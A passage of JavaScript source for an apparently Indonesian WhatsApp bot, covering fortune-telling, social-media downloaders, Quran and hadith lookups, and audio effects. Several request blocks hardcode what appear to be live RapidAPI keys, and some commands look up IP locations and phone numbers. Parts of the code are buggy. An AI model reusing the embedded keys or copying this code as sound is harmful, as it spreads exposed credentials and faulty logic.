                Manik.sendText(m.chat, `≻ *Nama :* ${anu.message.nama}\n≻ *Lahir :* ${anu.message.tgl_lahir}\n≻ *Life Path :* ${anu.message.life_path}\n≻ *Destiny :* ${anu.message.destiny}\n≻ *Destiny Desire :* ${anu.message.destiny_desire}\n≻ *Personality :* ${anu.message.personality}\n≻ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case prefix+'kecocokanpasangan': case prefix+'cocokpasangan': case prefix+'pasangan':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply `Example : ${command} Manik|Dini`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendImage(m.chat,  anu.message.gambar, `≻ *Nama Anda :* ${anu.message.nama_anda}\n≻ *Nama Pasangan :* ${anu.message.nama_pasangan}\n≻ *Sisi Positif :* ${anu.message.sisi_positif}\n≻ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case prefix+'jadianpernikahan': case prefix+'jadiannikah':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply `Example : ${command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Tanggal Pernikahan :* ${anu.message.tanggal}\n≻ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case prefix+'sifatusaha':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!ext)reply `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Lahir :* ${anu.message.hari_lahir}\n≻ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case prefix+'rejeki': case prefix+'rezeki':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply(`Example : ${command} 28, 10, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Lahir :* ${anu.message.hari_lahir}\n≻ *Rezeki :* ${anu.message.rejeki}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'pekerjaan': case prefix+'kerja':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply(`Example : ${command} 28, 10, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Lahir :* ${anu.message.hari_lahir}\n≻ *Pekerjaan :* ${anu.message.pekerjaan}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'ramalannasib': case prefix+'ramalnasib': case prefix+'nasib':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply `Example : 28, 10, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Analisa :* ${anu.message.analisa}\n≻ *Angka Akar :* ${anu.message.angka_akar}\n≻ *Sifat :* ${anu.message.sifat}\n≻ *Elemen :* ${anu.message.elemen}\n≻ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case prefix+'potensipenyakit': case prefix+'penyakit':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply(`Example : ${command} 28, 10, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Analisa :* ${anu.message.analisa}\n≻ *Sektor :* ${anu.message.sektor}\n≻ *Elemen :* ${anu.message.elemen}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'artitarot': case prefix+'tarot':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply(`Example : ${command} 28, 10, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendImage(m.chat, anu.message.image, `≻ *Lahir :* ${anu.message.tgl_lahir}\n≻ *Simbol Tarot :* ${anu.message.simbol_tarot}\n≻ *Arti :* ${anu.message.arti}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'fengshui':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply `Example : ${command} Manik, 1, 2005\n\nNote : ${command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Nama :* ${anu.message.nama}\n≻ *Lahir :* ${anu.message.tahun_lahir}\n≻ *Gender :* ${anu.message.jenis_kelamin}\n≻ *Angka Kua :* ${anu.message.angka_kua}\n≻ *Kelompok :* ${anu.message.kelompok}\n≻ *Karakter :* ${anu.message.karakter}\n≻ *Sektor Baik :* ${anu.message.sektor_baik}\n≻ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case prefix+'haribaik':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply(`Example : ${command} 28, 10, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Lahir :* ${anu.message.tgl_lahir}\n≻ *Kala Tinantang :* ${anu.message.kala_tinantang}\n≻ *Info :* ${anu.message.info}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'harisangar': case prefix+'taliwangke':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply(`Example : ${command} 28, 10, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Lahir :* ${anu.message.tgl_lahir}\n≻ *Hasil :* ${anu.message.result}\n≻ *Info :* ${anu.message.info}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'harinaas': case prefix+'harisial':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply(`Example : ${command} 28, 10, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Hari Lahir :* ${anu.message.hari_lahir}\n≻ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n≻ *Hari Naas :* ${anu.message.hari_naas}\n≻ *Info :* ${anu.message.catatan}\n≻ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case prefix+'nagahari': case prefix+'harinaga':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply(`Example : ${command} 28, 10, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Hari Lahir :* ${anu.message.hari_lahir}\n≻ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n≻ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'arahrejeki': case prefix+'arahrezeki':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply(`Example : ${command} 28, 10, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Hari Lahir :* ${anu.message.hari_lahir}\n≻ *tanggal Lahir :* ${anu.message.tgl_lahir}\n≻ *Arah Rezeki :* ${anu.message.arah_rejeki}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'peruntungan':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply `Example : ${command} Manik, 28, 10, 2005, 2022\n\nNote : ${command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Nama :* ${anu.message.nama}\n≻ *Lahir :* ${anu.message.tgl_lahir}\n≻ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n≻ *Hasil :* ${anu.message.result}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'weton': case prefix+'wetonjawa':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply(`Example : ${command} 28, 10, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Tanggal :* ${anu.message.tanggal}\n≻ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n≻ *Watak Hari :* ${anu.message.watak_hari}\n≻ *Naga Hari :* ${anu.message.naga_hari}\n≻ *Jam Baik :* ${anu.message.jam_baik}\n≻ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case prefix+'sifat': case prefix+'karakter':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply(`Example : ${command} Manik, 28, 10, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Nama :* ${anu.message.nama}\n≻ *Lahir :* ${anu.message.tgl_lahir}\n≻ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case prefix+'keberuntungan':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply(`Example : ${command} Manik, 28, 10, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Nama :* ${anu.message.nama}\n≻ *Lahir :* ${anu.message.tgl_lahir}\n≻ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case prefix+'memancing':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply `Example : ${command} 12, 1, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Tanggal :* ${anu.message.tgl_memancing}\n≻ *Hasil :* ${anu.message.result}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'masasubur':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply `Example : ${command} 12, 1, 2022, 28\n\nNote : ${command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Hasil :* ${anu.message.result}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'zodiak': case prefix+'zodiac':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply `Example : ${prefix+ command} 28 10 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Zodiak :* ${anu.message.zodiak}\n≻ *Nomor :* ${anu.message.nomor_keberuntungan}\n≻ *Aroma :* ${anu.message.aroma_keberuntungan}\n≻ *Planet :* ${anu.message.planet_yang_mengitari}\n≻ *Bunga :* ${anu.message.bunga_keberuntungan}\n≻ *Warna :* ${anu.message.warna_keberuntungan}\n≻ *Batu :* ${anu.message.batu_keberuntungan}\n≻ *Elemen :* ${anu.message.elemen_keberuntungan}\n≻ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n≻ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'shio':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply `Example : ${command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(text)
                if (anu.status == false) return m.reply(anu.message)
                Manik.sendText(m.chat, `≻ *Hasil :* ${anu.message}`, m)
            }
            break
           

case 'bot': {
await reply(`*STATUS BOT : AKTIF*`)
break
}

//Instagram
case prefix+'instagram':
if (!text) return m.reply('masukkan link nya')
	let bre = await fdl.downloader.instagram(text)
	let cucus = `\`\`\`INSTAGRAM DOWNLOADER\`\`\`

 Judul: ${bre.result.title}
 Durasi: ${bre.result.duration}
 
 `
	await Manik.sendMessage(from, { image: { url: `${bre.result.thumbnail}`}, caption: "hello!", gifPlayback: true })
	await Manik.sendMessage(from, { video: { url: `${bre.result.medias}`}, caption: "hello!", gifPlayback: true })
//TIKTOK

case prefix+'tiktoknowm':
if (!text) return m.reply('masukkan link nya')
	let cus = await fdl.downloader.tiktok(text)
	await Manik.sendMessage(
    from, 
    { 
        video: { url: cus.nowm}, 
        caption: `\`\`\`Nih Video Nya Kak ${pushname}\`\`\``,
        gifPlayback: true
    }
)

	
break

			case prefix+'tiktok':
			case prefix+'tt':
			    if (!text) return m.reply('masukkan link nya')
				let p = await fdl.downloader.tiktok(q)
				let nih = `\`\`\`TIKTOK DOWNLOADER\`\`\`

©️ *Creator:* ${p.creator}
📌 *Title:* ${p.title}
👤 *Author:* ${p.author}

Thank You
				`
				let jj = await (await fetch(`${p.thumbnail}`)).buffer()
				let buttons = [
                    {buttonId: `${prefix}tiktokmp3 ${text}`, buttonText: {displayText: 'Audio'}, type: 1},
                    {buttonId: `${prefix}tiktoknowm ${text}`, buttonText: {displayText: 'Video'}, type: 1},
                ]
                let buttonMessage = {
					image: { url: p.thumbnail },
                   // video: { url: p.nowm },
                    caption: nih,
                    title: '',
                    footer: 'Video Or Audio?',
                    buttons: buttons,
                    headerType: 5
                }
               await Manik.sendMessage(from, buttonMessage, { quoted: m })
				//await Manik.send2ButtonLoc(from, Manik.resize(jj,300,300), 'tes', 'Video Or Audio?', 'Video', 'a', 'Audio', 0)
				
				
			    break
				
				
				
				
case prefix+'ttaudio':
			case prefix+'tiktokmp3': 
			case prefix+'tiktokaudio': {
				if (!text) return m.reply('masukkan link nya')
				let aud = await fdl.downloader.tiktok(text)
				let cap = ` *TIKTOK AUDIO*

©️ *Creator:* Arya Manik
📌 *Title:* ${aud.title}
👤 *Author:* ${aud.author}

Thank You
				`
				Manik.sendMessage(from, { audio: { url: aud.audio }, mimetype: 'audio/mpeg'}, { quoted: m })
				}
				break
            case prefix+'joox': case prefix+'jooxdl':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply('Titel Mana Kak?')
                reply('Fitur Eror Males Fix')
            }
            break
            case prefix+'soundcloud': case prefix+'scdl':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply('Titel Mana Kak?')
                reply('Gatau Bisa Apa Gak')
                let anu = await fetchJson(api('xteam', '/dl/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                let msg = await Manik.sendImage(m.chat, anu.result.thumb, `âž£ Title : ${anu.result.title}\nâž£ Url : ${isUrl(text)[0]}`)
                Manik.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: m })
            }
            break
case prefix+'twtdl': case prefix+'twt': case prefix+'twitterdl': case prefix+'twitter':
if (!q) return reply(`Kirim perintah ${command.slice(1)} link`)
await reply(mess.wait)
xfar.Twitter(q).then(async data => {
let txt = ('p')
Manik.sendMessage(m.chat,{ video: { url: data.medias[1].url}},txt,m)})

break
case prefix+'facebook': case prefix+'fb': case prefix+'fbdl': case prefix+'facebookdl':
if (!q) return reply(`Kirim perintah ${command.slice(1)} link`)
await reply(mess.wait)
xfar.Facebook(q).then(async data => {
let txt = `*FACEBOOK DOWNLOADER*\n\n`
txt += `*Title :* ${data.title}\n`
txt += `* Type :* ${data.medias[0].extension}\n`
txt += `*Quality :* ${data.medias[0].quality}\n`
txt += `*Size :* ${data.medias[0].formattedSize}\n`
txt += `*Url :* ${data.url}`
sendFile(m.chat,data.medias[0].url,txt,msg)
})

break


          
case 'beetunha':
const hahahe = {
  method: 'GET',
  url: 'https://anime-quotes1.p.rapidapi.com/api/available/anime',
  headers: {
    'X-RapidAPI-Key': '837661b454msh274b6753ca80823p11c653jsn973bb2a55a34',
    'X-RapidAPI-Host': 'anime-quotes1.p.rapidapi.com'
  }
};
let requestt = require('request')
requestt(hahahe, function (error, response, body) {
	if (error) throw new Error(error);
   reply(body);
	console.log(body);
});
break
case prefix+'ipdomain':
    reply(mess.wait)
    const driphacker = {
      method: 'GET',
      url: 'https://find-any-ip-address-or-domain-location-world-wide.p.rapidapi.com/iplocation',
      qs: {ip: `${text}`, apikey: '873dbe322aea47f89dcf729dcc8f60e8'},
      headers: {
        'X-RapidAPI-Key': '837661b454msh274b6753ca80823p11c653jsn973bb2a55a34',
        'X-RapidAPI-Host': 'find-any-ip-address-or-domain-location-world-wide.p.rapidapi.com',
        useQueryString: true
      }
    };
    let mhamha = require('request')
    mhamha(driphacker, function (error, response, body) {
      if (error) throw new Error(error);
       reply(body);
      console.log(body);
    });
    break
    case prefix+'ip':
      reply(mess.wait)
      const dripsba = {
        method: 'GET',
        url: 'https://find-any-ip-address-or-domain-location-world-wide.p.rapidapi.com/iplocation',
        qs: {apikey: '873dbe322aea47f89dcf729dcc8f60e8'},
        headers: {
          'X-RapidAPI-Key': '837661b454msh274b6753ca80823p11c653jsn973bb2a55a34',
          'X-RapidAPI-Host': 'find-any-ip-address-or-domain-location-world-wide.p.rapidapi.com',
          useQueryString: true
        }
      };
      let bhudhi = require('request')
      bhudhi(dripsba, function (error, response, body) {
        if (error) throw new Error(error);
        reply(body);
        console.log(body);
      });
break
case prefix+'ceknomor':
  reply(mess.wait)
  const dripska = {
    method: 'GET',
    url: 'https://phonenumbervalidatefree.p.rapidapi.com/ts_PhoneNumberValidateTest.jsp',
    qs: {number: `${text}`},
    headers: {
      'X-RapidAPI-Key': '837661b454msh274b6753ca80823p11c653jsn973bb2a55a34',
      'X-RapidAPI-Host': 'phonenumbervalidatefree.p.rapidapi.com',
      useQueryString: true
    }
  };
  let dhidhi = require('request')
  dhidhi(dripska, function (error, response, body) {
    if (error) throw new Error(error);
    reply(body);
    console.log(body);
  });
break
case prefix+'veriphone':
  reply(mess.wait)
  const dripdrop = {
    method: 'GET',
    url: 'https://veriphone.p.rapidapi.com/verify',
    qs: {phone: `${text}`},
    headers: {
      'X-RapidAPI-Key': '837661b454msh274b6753ca80823p11c653jsn973bb2a55a34',
      'X-RapidAPI-Host': 'veriphone.p.rapidapi.com',
      useQueryString: true
    }
  };
  let mhati = require('request')
  mhati(dripdrop, function (error, response, body) {
    if (error) throw new Error(error);
    reply(body);
    console.log(body);
  });
  break
	        case prefix+'pindl': case prefix+'pinterestdl':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply('Link Mana Kak?')
                reply('Eror Bodo Males Fix Buka Github')
            }
            break
            case prefix+'umma': case prefix+'ummadl':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
	        if (!text) return reply `Example : ${command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./FuncBot/scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: ' Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: ' Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
≻ Title : ${anu.title}
≻ Author : ${anu.author.name}
≻ Like : ${anu.like}
≻ Caption : ${anu.caption}
≻ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: Manik.user.name,
			buttons,
			headerType: 4
		    }
		    Manik.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        Manik.sendMessage(m.chat, { image: { url }, caption: `≻ Title : ${anu.title}\n≻ Author : ${anu.author.name}\n≻ Like : ${anu.like}\n≻ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case prefix+'ringtone':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
		if (!text) return reply `Example : ${command} black rover`
        let { ringtone } = require('./FuncBot/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		Manik.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case prefix+'iqra':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
		oh = `Example : ${command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) return reply(oh)
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		Manik.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => reply(oh))
		}
		break
		case prefix+'juzamma':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
		if (args[1] === 'pdf') {
		reply(mess.wait)
		Manik.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[1] === 'docx') {
		reply(mess.wait)
		Manik.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[1] === 'pptx') {
		reply(mess.wait)
		Manik.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[1] === 'xlsx') {
		reply(mess.wait)
		Manik.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		reply(`Mau format apa ? Example : ${command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break
		case prefix+'hadis': case prefix+'hadist':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
		if (!args[1]) return reply `Contoh:
${command} bukhari 1
${command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) return reply `Hadis yang ke berapa?\n\ncontoh:\n${command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[1]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case prefix+'alquran':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
		if (!args[1]) return reply `Contoh penggunaan:\n${command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) return reply `Contoh penggunaan:\n${command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[1]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		reply(txt)
		Manik.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case prefix+'tafsirsurah':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
		if (!args[1]) return reply `Contoh penggunaan:\n${command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) return reply `Contoh penggunaan:\n${command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[1]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
		   case prefix+'bass': case prefix+'blown': case prefix+'deep': case prefix+'earrape': case prefix+'fast': case prefix+'fat': case prefix+'nightcore': case prefix+'reverse': case prefix+'robot': case prefix+'slow': case prefix+'smooth': case prefix+'tupai':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                reply(mess.wait)
                let media = await Manik.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return reply(err)
                let buff = fs.readFileSync(ran)
                Manik.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg',ptt: true}, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else reply(`Balas audio yang ingin diubah dengan caption *${command}*`)
                } catch (e) {
                reply(e)
                }
                break
            case prefix+'setcmd':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!m.quoted) return reply `Reply Pesan!`
                if (!m.quoted.fileSha256) return reply `SHA256 Hash Missing`
                if (!text) return reply `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return reply `You have no permission to change this sticker command`
                global.db.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                reply(`Done!`)
            }
            break
            case prefix+'delcmd':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
